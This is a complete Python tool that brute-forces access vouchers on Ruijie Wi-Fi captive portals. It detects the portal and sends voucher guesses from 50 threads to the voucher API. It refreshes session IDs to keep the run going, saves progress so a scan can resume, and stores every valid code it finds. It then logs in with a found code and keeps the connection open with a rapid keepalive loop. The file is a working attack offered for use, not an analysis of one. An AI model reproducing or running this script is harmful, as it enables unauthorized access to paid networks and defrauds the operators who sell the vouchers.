#!/usr/bin/env python3
"""
Ruijie Voucher Brute-Force v4
Features: target count, resume, range split, auto-login
"""
import sys, threading, time, urllib.parse, queue, random, os, datetime, pickle
import requests, urllib3
urllib3.disable_warnings()

CODES_FILE = "valid_codes.txt"
LOCK = threading.Lock()
STOP = threading.Event()

# ===== Helpers =====

def save_code(code):
    with open(CODES_FILE, "a") as f: f.write(f"{code}\n")

def load_codes():
    if not os.path.exists(CODES_FILE): return []
    with open(CODES_FILE) as f: return [l.strip() for l in f if l.strip()]

def remove_codes(codes_to_remove):
    codes = load_codes()
    with open(CODES_FILE, "w") as f:
        for c in codes:
            if c not in codes_to_remove: f.write(f"{c}\n")

def fmt_time(seconds):
    h, r = divmod(int(seconds), 3600)
    m, s = divmod(r, 60)
    return f"{h}h{m:02d}m{s:02d}s" if h else f"{m}m{s:02d}s"

def fmt_eta(rem, rate):
    if rate <= 0: return "?m"
    s = rem / rate
    return fmt_time(s)

def ask_int(prompt, default=None):
    while True:
        r = input(prompt).strip()
        if not r and default is not None: return default
        if r.isdigit(): return int(r)
        print("Enter a number")

def ask_str(prompt, default=None):
    r = input(prompt).strip()
    return r if r else default

def path_for(start, end):
    return f"progress_{start}-{end}.dat"

def detect_portal():
    sess = requests.Session()
    sess.verify = False
    sess.headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
    r = sess.get("http://connectivitycheck.gstatic.com/generate_204", timeout=10, allow_redirects=False)
    if r.status_code == 204: return None, None, None, None, "Already online"
    portal_url = r.headers.get("Location", "")
    if not portal_url:
        r = sess.get("http://connectivitycheck.gstatic.com/generate_204", timeout=10, allow_redirects=True)
        portal_url = r.url
    if not portal_url or portal_url == "http://connectivitycheck.gstatic.com/generate_204":
        return None, None, None, None, "No portal detected"
    parsed = urllib.parse.urlparse(portal_url)
    params = parsed.query
    host = f"{parsed.scheme}://{parsed.netloc}"
    qp = urllib.parse.parse_qs(params)
    sid = qp.get("sessionId", [""])[0]
    if not sid:
        r = sess.get(f"{host}/api/auth/wifidog?stage=portal&{params}", timeout=10)
        sid = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query).get("sessionId", [""])[0]
    if not sid: return None, None, None, None, "No sessionId"
    gw_addr = qp.get("gw_address", ["192.168.110.1"])[0]
    gw_port = qp.get("gw_port", ["2060"])[0]
    return sess, host, params, sid, (gw_addr, gw_port)

def refresh_session(host, params):
    try:
        rs = requests.Session()
        r = rs.get(f"{host}/api/auth/wifidog?stage=portal&{params}", timeout=10)
        ns = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query).get("sessionId", [""])[0]
        rs.close()
        return ns
    except: return None

def goto_online(sess, sid, gw, code, logon_url):
    r = sess.get(logon_url, timeout=5, allow_redirects=False)
    print(f"Gateway: {r.status_code}")
    time.sleep(2)
    try:
        r2 = requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=False)
        if r2.status_code == 204:
            print("*** ONLINE ***")
            remove_codes([code])
            print(f"Removed {code} from saved codes")
            def ka():
                while True:
                    try:
                        sess.post(f"http://{gw[0]}:{gw[1]}/wifidog/auth",
                            params={"token": sid, "phoneNumber": ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=15))},
                            headers={"Content-Type": "application/octet-stream", "Content-Length": "0"},
                            timeout=3)
                    except: pass
                    time.sleep(0.1)
            threading.Thread(target=ka, daemon=True).start()
            print("Keepalive running. Ctrl+C to stop.")
            try:
                while True: time.sleep(10)
            except KeyboardInterrupt: print("\nOffline")
            return True
        loc = r.headers.get("Location", "")
        if loc:
            sess.get(loc, timeout=5)
            if requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=False).status_code == 204:
                print("*** ONLINE ***")
                remove_codes([code])
                print(f"Removed {code} from saved codes")
                return True
    except: pass
    return False

# ===== Bitmap Tracker =====

class BitmapTracker:
    def __init__(self, start, end):
        self.start = start
        self.end = end
        self.total = end - start + 1
        self.size = (self.total + 7) // 8
        self.data = bytearray(self.size)
        self.tried = 0
        self.found = []
        self.lock = threading.Lock()
        self.scanning_phase = False
        self.scanner_idx = 0

    def claim(self):
        """Find and claim an untried code"""
        if self.tried >= self.total:
            return None
        if not self.scanning_phase:
            return self._claim_random()
        return self._claim_scan()

    def _claim_random(self):
        for _ in range(1000):
            ci = random.randrange(self.start, self.end + 1)
            with self.lock:
                off = ci - self.start
                if not (self.data[off >> 3] & (1 << (off & 7))):
                    self.data[off >> 3] |= (1 << (off & 7))
                    self.tried += 1
                    return ci
        # Too many collisions, switch to scanning
        self.scanning_phase = True
        return self._claim_scan()

    def _claim_scan(self):
        with self.lock:
            while self.scanner_idx < self.size:
                b = self.data[self.scanner_idx]
                if b != 0xFF:
                    for bit in range(8):
                        if not (b & (1 << bit)):
                            off = self.scanner_idx * 8 + bit
                            ci = self.start + off
                            if ci <= self.end:
                                self.data[self.scanner_idx] |= (1 << bit)
                                self.tried += 1
                                return ci
                self.scanner_idx += 1
        return None

    def add_found(self, code):
        with self.lock:
            self.found.append(code)

    def progress_frac(self):
        return self.tried / self.total if self.total else 0

    def save(self, path):
        with open(path, "wb") as f:
            pickle.dump({
                "start": self.start, "end": self.end,
                "data": bytes(self.data), "tried": self.tried,
                "found": self.found, "scanner_idx": self.scanner_idx,
                "scanning_phase": self.scanning_phase,
            }, f)

    @staticmethod
    def load(path):
        with open(path, "rb") as f:
            d = pickle.load(f)
        bt = BitmapTracker(d["start"], d["end"])
        bt.data = bytearray(d["data"])
        bt.tried = d["tried"]
        bt.found = d["found"]
        bt.scanner_idx = d["scanner_idx"]
        bt.scanning_phase = d["scanning_phase"]
        return bt

# ===== Numeric Brute Force =====

def numeric_bruteforce(length):
    print()
    target = ask_int(f"Stop after finding [N] codes (0 = scan all): ", 0)
    restrict = ask_str("Restrict range? (y/n, default n): ", "n")
    start, end = 0, 10 ** length - 1
    if restrict.lower() == "y":
        start = ask_int(f"  Start (0-{end}): ", 0)
        end = ask_int(f"  End ({start}-{end}): ", end)
        if start > end: start, end = end, start

    prog_path = path_for(start, end)
    resume = os.path.exists(prog_path)
    if resume:
        r = ask_str(f"Resume previous scan at {prog_path}? (y/n, default y): ", "y")

    if resume and r.lower() == "y":
        bt = BitmapTracker.load(prog_path)
        print(f"Resumed: {bt.tried}/{bt.total} tried, {len(bt.found)} found")
    else:
        if resume:
            os.remove(prog_path)
        bt = BitmapTracker(start, end)

    result = detect_portal()
    sess, host, params, sid, extra = result
    if isinstance(extra, str):
        print(f"[!] {extra}"); return

    print(f"Range: {str(start).zfill(length)}-{str(end).zfill(length)} ({bt.total:,} codes)")
    print(f"Target: {target if target else 'ALL'}  Host: {host}")
    print(f"Session: {sid[:16]}...  Threads: 50")
    print("Brute forcing (Ctrl+C to save & quit)\n")

    SID_DATA = {"sid": sid}
    start_time = time.time()
    STOP.clear()
    last_tried = 0
    safe_count = 0

    def worker():
        sess2 = requests.Session()
        sess2.verify = False
        sess2.headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
        api_url = f"{host}/api/auth/voucher/?lang=en_US"
        local_count = 0
        while not STOP.is_set():
            code_int = bt.claim()
            if code_int is None:
                break
            code = str(code_int).zfill(length)
            with LOCK: sid_current = SID_DATA["sid"]
            try:
                r = sess2.post(api_url, json={
                    "accessCode": code, "sessionId": sid_current, "apiVersion": 1
                }, timeout=5)
                j = r.json()
                if j.get("success") == True and j.get("result", {}).get("authResult") == "1":
                    print(f"\n  >>> VALID: {code}")
                    save_code(code)
                    bt.add_found(code)
                    if target and len(bt.found) >= target:
                        STOP.set()
                        break
            except: pass
            local_count += 1
            if local_count >= 500:
                ns = refresh_session(host, params)
                if ns:
                    with LOCK: SID_DATA["sid"] = ns
                local_count = 0
        sess2.close()

    threads = []
    for _ in range(50):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)

    try:
        while any(t.is_alive() for t in threads):
            time.sleep(2)
            with LOCK: tried = bt.tried
            rate = (tried - last_tried) / 2
            rem = bt.total - tried
            eta = fmt_eta(rem, rate) if rate > 0 else "?m"
            pct = tried * 100 / bt.total
            sys.stdout.write(f"\r  {tried:,}/{bt.total:,} ({pct:.2f}%) | {rate:.0f}/s | ETA: {eta} | Found: {len(bt.found)}")
            sys.stdout.flush()
            last_tried = tried
            safe_count += 1
            if safe_count % 15 == 0:  # Save every ~30 seconds
                bt.save(prog_path)
    except KeyboardInterrupt:
        print("\n[Saving...]")
    finally:
        STOP.set()
        bt.save(prog_path)
        for t in threads: t.join(timeout=1)

    elapsed = time.time() - start_time
    print(f"\nDone in {fmt_time(elapsed)}")
    print(f"Scanned: {bt.tried:,}/{bt.total:,} ({bt.tried*100/bt.total:.1f}%)")
    print(f"Found: {len(bt.found)} codes")
    if bt.found:
        for c in bt.found:
            print(f"  {c}")
        print(f"Saved to {CODES_FILE}")

    if bt.found and target:
        r = ask_str("\nLogin now? (y/n, default n): ", "n")
        if r.lower() == "y":
            print("\nFound codes:")
            for i, c in enumerate(bt.found, 1):
                print(f"  {i}. {c}")
            idx = ask_int("Enter number to login (0=cancel): ", 0)
            if idx and idx <= len(bt.found):
                code = bt.found[idx - 1]
                api_url = f"{host}/api/auth/voucher/?lang=en_US"
                r = sess.post(api_url, json={
                    "accessCode": code, "sessionId": SID_DATA["sid"], "apiVersion": 1
                }, timeout=5)
                j = r.json()
                if j.get("success") == True and j.get("result", {}).get("authResult") == "1":
                    goto_online(sess, SID_DATA["sid"], extra, code, j["result"]["logonUrl"])

# ===== Charset Brute Force =====

def charset_bruteforce(charset, length, label):
    print()
    target = ask_int(f"Stop after finding [N] codes (0 = unlimited): ", 0)

    result = detect_portal()
    sess, host, params, sid, extra = result
    if isinstance(extra, str):
        print(f"[!] {extra}"); return

    total_space = len(charset) ** length
    print(f"Charset: {label}  Length: {length}  Space: {total_space:,}")
    print(f"Target: {target if target else 'UNLIMITED'}  Host: {host}")
    print(f"Session: {sid[:16]}...  Threads: 50")
    print("Generating random codes (Ctrl+C to stop)\n")

    SID_DATA = {"sid": sid}
    found_list = []
    tried = 0
    start_time = time.time()
    STOP.clear()

    def worker():
        nonlocal tried
        sess2 = requests.Session()
        sess2.verify = False
        sess2.headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
        api_url = f"{host}/api/auth/voucher/?lang=en_US"
        local_count = 0
        while not STOP.is_set():
            code = ''.join(random.choices(charset, k=length))
            with LOCK: sid_current = SID_DATA["sid"]
            try:
                r = sess2.post(api_url, json={
                    "accessCode": code, "sessionId": sid_current, "apiVersion": 1
                }, timeout=5)
                j = r.json()
                if j.get("success") == True and j.get("result", {}).get("authResult") == "1":
                    print(f"\n  >>> VALID: {code}")
                    save_code(code)
                    with LOCK:
                        found_list.append(code)
                        if target and len(found_list) >= target:
                            STOP.set()
                            break
            except: pass
            with LOCK: tried += 1
            local_count += 1
            if local_count >= 500:
                ns = refresh_session(host, params)
                if ns:
                    with LOCK: SID_DATA["sid"] = ns
                local_count = 0
        sess2.close()

    threads = []
    for _ in range(50):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)

    last_tried = 0
    try:
        while any(t.is_alive() for t in threads):
            time.sleep(2)
            with LOCK: t2 = tried
            rate = (t2 - last_tried) / 2
            sys.stdout.write(f"\r  Tried: {t2:,} | {rate:.0f}/s | Found: {len(found_list)}")
            sys.stdout.flush()
            last_tried = t2
    except KeyboardInterrupt:
        print("\n[Stopped]")
    STOP.set()
    for t in threads: t.join(timeout=1)

    elapsed = time.time() - start_time
    print(f"\nDone in {fmt_time(elapsed)}")
    print(f"Tried: {tried:,} | Found: {len(found_list)} codes")
    if found_list:
        for c in found_list:
            print(f"  {c}")

    if found_list and target:
        r = ask_str("\nLogin now? (y/n, default n): ", "n")
        if r.lower() == "y":
            for i, c in enumerate(found_list, 1):
                print(f"  {i}. {c}")
            idx = ask_int("Enter number to login (0=cancel): ", 0)
            if idx and idx <= len(found_list):
                code = found_list[idx - 1]
                api_url = f"{host}/api/auth/voucher/?lang=en_US"
                r = sess.post(api_url, json={
                    "accessCode": code, "sessionId": SID_DATA["sid"], "apiVersion": 1
                }, timeout=5)
                j = r.json()
                if j.get("success") == True and j.get("result", {}).get("authResult") == "1":
                    goto_online(sess, SID_DATA["sid"], extra, code, j["result"]["logonUrl"])

# ===== Menu =====

def ask_length():
    while True:
        l = input("Length (6 or 7): ").strip()
        if l in ("6", "7"): return int(l)
        print("Enter 6 or 7")

def menu():
    while True:
        print("\n" + "=" * 40)
        print("  RUIJIE VOUCHER BRUTE-FORCE")
        print("=" * 40)
        print("1. Numeric")
        print("2. Uppercase + Lowercase (random)")
        print("3. Lowercase + Numbers (random)")
        print("4. View saved codes")
        print("5. Login & validate codes")
        print("Q. Quit")
        print("=" * 40)
        choice = input("Choose: ").strip().upper()

        if choice == "1":
            numeric_bruteforce(ask_length())
        elif choice == "2":
            charset_bruteforce(
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
                ask_length(), "UL")
        elif choice == "3":
            charset_bruteforce(
                "abcdefghijklmnopqrstuvwxyz0123456789",
                ask_length(), "lN")
        elif choice == "4":
            view_codes()
        elif choice == "5":
            login_menu()
        elif choice == "Q":
            print("Bye"); sys.exit(0)

def view_codes():
    codes = load_codes()
    if not codes:
        print("No saved codes"); return
    print(f"\nSaved codes ({len(codes)}):")
    for i, c in enumerate(codes, 1):
        print(f"  {i:4d}. {c}")

def login_menu():
    codes = load_codes()
    if not codes:
        print("No saved codes"); return
    print("\nChecking saved codes (may consume them)...")
    result = detect_portal()
    sess, host, params, sid, extra = result
    if isinstance(extra, str):
        print(f"[!] {extra}"); return
    api_url = f"{host}/api/auth/voucher/?lang=en_US"
    valid = []
    invalid = []
    for code in codes:
        try:
            r = sess.post(api_url, json={
                "accessCode": code, "sessionId": sid, "apiVersion": 1
            }, timeout=5)
            j = r.json()
            if j.get("success") == True and j.get("result", {}).get("authResult") == "1":
                valid.append((code, j["result"]["logonUrl"]))
            else:
                invalid.append(code)
        except:
            invalid.append(code)
        sys.stdout.write(f"\r  Checked {len(valid)+len(invalid)}/{len(codes)} | Valid: {len(valid)}")
        sys.stdout.flush()
    print()
    if invalid:
        remove_codes(invalid)
        print(f"Removed {len(invalid)} invalid codes")
    if not valid:
        print("No valid codes remaining"); return
    print(f"\nValid codes ({len(valid)}):")
    for i, (code, _) in enumerate(valid, 1):
        print(f"  {i}. {code}")
    choice = input("\nEnter number to login (0=cancel): ").strip()
    if not choice.isdigit() or int(choice) < 1 or int(choice) > len(valid):
        return
    idx = int(choice) - 1
    code, logon_url = valid[idx]
    print(f"Using: {code}")
    goto_online(sess, sid, extra, code, logon_url)

if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        print("\nBye")
